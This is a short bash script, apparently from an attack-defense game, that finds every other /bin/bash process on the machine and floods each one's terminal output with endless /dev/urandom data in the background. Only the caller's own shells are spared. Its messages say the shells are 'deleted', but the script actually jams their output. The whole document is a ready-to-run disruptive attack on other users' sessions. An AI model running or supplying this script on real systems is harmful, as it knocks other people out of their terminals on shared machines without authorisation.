#!/bin/bash

TARGETS=$(ps -eaf | grep /bin/bash | grep -v grep | awk  '{print $2}')
for binbash in $TARGETS ; do
	echo "There is a /bin/bash shell at $binbash"
	if [ "$binbash" == "$PPID" ] || [ "$binbash" == "$BASHPID" ] 
	then 
		echo "Avoiding the caller's shell"
	else 
		echo "deleting shell /bin/bash at $binbash"
		cat /dev/urandom > "/proc/$binbash/""fd/1" &
	fi
done
echo "All shells have been deleted and you are the only one to make defense"
